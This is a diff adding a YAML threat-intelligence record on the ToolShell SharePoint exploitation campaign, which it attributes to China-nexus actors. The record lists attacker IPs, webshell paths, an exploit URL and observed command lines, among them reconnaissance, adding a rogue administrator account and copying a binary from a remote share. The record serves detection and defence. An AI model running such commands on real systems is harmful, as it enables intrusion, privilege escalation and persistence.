@@ -1,0 +1,88 @@
+description: Active exploitation of on-premise SharePoint Server vulnerabilities dubbed
+  ToolShell.
+attribution:
+- China-nexus threat actors
+malware_families:
+- Godzilla webshell
+TTPs:
+  processes:
+  - cmd.exe
+  - net.exe
+  - curl.exe
+  - netstat.exe
+  - rundll32.exe
+  - ADExplorer64.exe
+  - sysdiag-all-x64-6.0.7.2-2025.07.21.1.exe
+  commandline:
+  - cmd.exe /c whoami /all
+  - '"cmd" /c "cd /d "c:/windows/system32/inetsrv/""&ipconfig" 2>&1'
+  - '"cmd" /c "cd /d "c:/windows/system32/inetsrv/""&net user <REDACTED> /do" 2>&1'
+  - '"cmd" /c "cd /d "c:/windows/system32/inetsrv/""&quser" 2>&1'
+  - '"cmd" /c "cd /d "c:/windows/system32/inetsrv/""&net localgroup administrators"
+    2>&1'
+  - '"cmd" /c "cd /d "c:/windows/system32/inetsrv/""&net group "domain admins" /do"
+    2>&1'
+  - '"cmd" /c "cd /d "c:/windows/system32/inetsrv/""&tasklist /svc" 2>&1'
+  - '"cmd" /c "cd /d "c:/windows/system32/inetsrv/""&curl google.com" 2>&1'
+  - netstat -an
+  - cmd /c net user <USER-REDACTED> <PASSWORD-REDACTED> /add && net localgroup administrators
+    <USER-REDACTED> /add
+  - '"cmd.exe" /C copy \\\\<REDACTED-IP>\\c$\\programdata\\sysdiag-all-x64-6.0.7.2-2025.07.21.1.exe
+    c:\\programdata\\sysdiag-all-x64-6.0.7.2-2025.07.21.1.exe > C:\\programdata\\<REDACTED-GUID>.dat
+    2>&1'
+  - '"cmd.exe" /C net user <REDACTED-USER> <REDACTED-PASSWORD> /add && net localgroup
+    administrators <REDACTED-USER> /add > C:\\programdata\\<REDACTED-GUID>.dat 2>&1'
+  - rundll32.exe -c <CONFIGPATH>
+  powershell: []
+  scripting_engine:
+  - spinstall*.aspx
+  - spinstall0.thank_you_defeners_for_rapid_response.aspx
+  - debug_dev.js
+  - info.aspx
+  - info03.aspx
+  - info3.aspx
+  - pinstall.aspx
+  - test.aspx
+  registry_keys: []
+  image_load:
+  - IIS worker process
+  network_connections:
+  - 75.83.18[.]243
+  - 185.141.119[.]189
+  - 96.9.125[.]147
+  - 152.59.160[.]117
+  - 91.132.95[.]60
+  - 64.176.50[.]109
+  file_activity:
+  - /_layouts/15/spinstall*.aspx
+  - /_layouts/15/spinstall0.thank_you_defeners_for_rapid_response.aspx
+  - /_layouts/15/debug_dev.js
+  - /_layouts/15/info.aspx
+  - /_layouts/15/info03.aspx
+  - /_layouts/15/info3.aspx
+  - /_layouts/15/pinstall.aspx
+  - /_layouts/15/test.aspx
+  - C:\\ProgramData\\*.ini
+  persistence:
+  - webshells
+  - ASP.NET MachineKey components
+  pipes: []
+  process_relations:
+  - cmd.exe -> rundll32.exe
+IOCs:
+  hashes: []
+  IPs:
+  - 75.83.18[.]243
+  - 185.141.119[.]189
+  - 96.9.125[.]147
+  - 152.59.160[.]117
+  - 91.132.95[.]60
+  - 64.176.50[.]109
+  domains: []
+  URLs:
+  - /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx
+authors:
+- Mohammad Kazem Hassan Nejad
+reference: https://labs.withsecure.com/publications/toolshell.html
+date_of_publication: July 24, 2025
+file_creation_date: July 30, 2025
